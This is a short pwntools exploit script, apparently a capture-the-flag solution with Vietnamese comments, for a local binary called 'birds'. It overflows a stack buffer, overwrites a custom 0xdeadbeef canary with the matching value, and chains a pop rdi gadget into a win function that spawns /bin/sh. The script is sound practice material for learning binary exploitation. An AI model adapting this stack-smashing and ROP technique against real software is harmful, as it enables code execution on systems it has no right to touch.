from pwn import *

exe = context.binary = ELF('./birds')
p = process('./birds')
#input()
win_addr = exe.sym.win # 0x00000000004011c4
pop_rdi = 0x00000000004011c0 # pop rdi ; nop ; pop rbp ; ret

# Checksec khong thay canary duoc bat => custom canary check trong IDA
# if ( v5 != 0xDEADBEEF )
#   {
#     puts("No stack smashing for you!");
#     exit(1);
#   }

# -0000000000000050 // Use data definition commands to manipulate stack variables and arguments.
# -0000000000000050 // Frame size: 50; Saved regs: 8; Purge: 0
# -0000000000000050
# -0000000000000050     _BYTE v4[76];  
# -0000000000000004     _DWORD v5; // 4 byte
# +0000000000000000     _QWORD __saved_registers; // 8 byte (saved rbp)
# +0000000000000008     _UNKNOWN *__return_address; // 8 byte dia chi tra ve
# +0000000000000010
# +0000000000000010 // end of stack variables

# De vuot qua check dau thi can lam tran bien v4, khi tran sang v5 thi cho no gia tri la 0xdeadbeef

payload = b'A'*76 # bof
payload += p32(0xdeadbeef) # Can su dung 4 byte de ghi chinh xac gia tri cua v5 nen ta se dung p32()
						   # Neu dung p64() se ghi 8 byte => ko vuot qua check
payload += b'B'*8 # RBP

# int __fastcall win(int a1)
# {
#   int result; // eax

#   if ( a1 == 0xA1B2C3D4 )
#     return system("/bin/sh");
#   return result;
# }

# Ham win can dua a1 vao, checksec khong co PIE => tim pop rdi bang ROPgadget sau do dua a1(=0xA1B2C3D4) vao

payload += p64(pop_rdi)
payload += p64(0xA1B2C3D4) # RDI dung p64 de truyen a1 vao do rdi la thanh ghi 64bit
payload += p64(0) # RBP, khong su dung den
payload += p64(win_addr) # Nhay den win

p.sendlineafter(b'I made a canary to stop buffer overflows. Prove me wrong!\n', payload)

p.interactive()